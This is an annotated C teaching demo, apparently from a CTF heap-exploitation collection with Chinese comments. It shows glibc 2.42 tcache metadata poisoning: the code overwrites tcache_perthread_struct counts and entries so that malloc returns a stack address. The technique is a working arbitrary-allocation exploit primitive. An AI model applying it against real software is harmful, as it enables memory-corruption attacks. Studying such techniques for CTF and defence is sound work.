/*
 * 中文导读（CTF 版）
 *
 * 手法：tcache_metadata_poisoning
 * 文件标注范围：2.42
 * 模拟漏洞：能对 tcache_perthread_struct 发起越界写或重叠写。
 * 核心流程：直接改写 counts/num_slots 和 entries 字段；2.42 的 entries 表头仍是明文，
 *   只有 large 链中间的 next 槽才启用安全链接；2.43 的结构体偏移又发生了变化。
 * 成功判据：目标尺寸的下一次分配返回任意指定的对齐地址。注意旧版本的 counts/entries
 *   偏移不能直接套用到 2.42 及以后的版本。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// tcache 元数据投毒攻击
//
// 攻击者一旦能覆盖 tcache 的管理结构，就可以把任意目标地址直接写进指定
// 尺寸桶对应的 entries 表头。随后申请同等大小的 chunk 时，malloc 会把这个
// 地址当作空闲节点返回，这样就把“元数据覆盖”转化成了“任意地址分配”原语。

// 早期版本默认有 64 个 tcache 尺寸桶；这个常量在较新版本里会发生变化。
#define TCACHE_BINS 76
// x86-64 上，普通堆块的头部占 0x10 字节，由 prev_size 和 size 两个机器字组成。
#define HEADER_SIZE 0x10

// 下面按本文件对应的目标版本复刻 tcache_perthread_struct，也就是线程本地的 tcache 元数据。
struct tcache_metadata {
  uint16_t counts[TCACHE_BINS];
  void *entries[TCACHE_BINS];
};

int main() {
  // 关闭标准流缓冲，避免 stdio 内部的隐式堆分配打乱本例依赖的相对布局。
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  uint64_t stack_target __attribute__ ((aligned (0x10))) = 0x1337;

  uint64_t *victim = malloc(0x10);

  long metadata_size = sizeof(struct tcache_metadata);
  long rounded_metadata_size = metadata_size & ~(HEADER_SIZE-1); // 向下对齐到 chunk 头的宽度，方便反推元数据的起始地址。

  struct tcache_metadata *metadata =
      (struct tcache_metadata *)((long)victim - rounded_metadata_size - HEADER_SIZE);

  metadata->counts[1] = 6;
  metadata->entries[1] = &stack_target;

  uint64_t *evil = malloc(0x20);

  assert(evil == &stack_target);
}
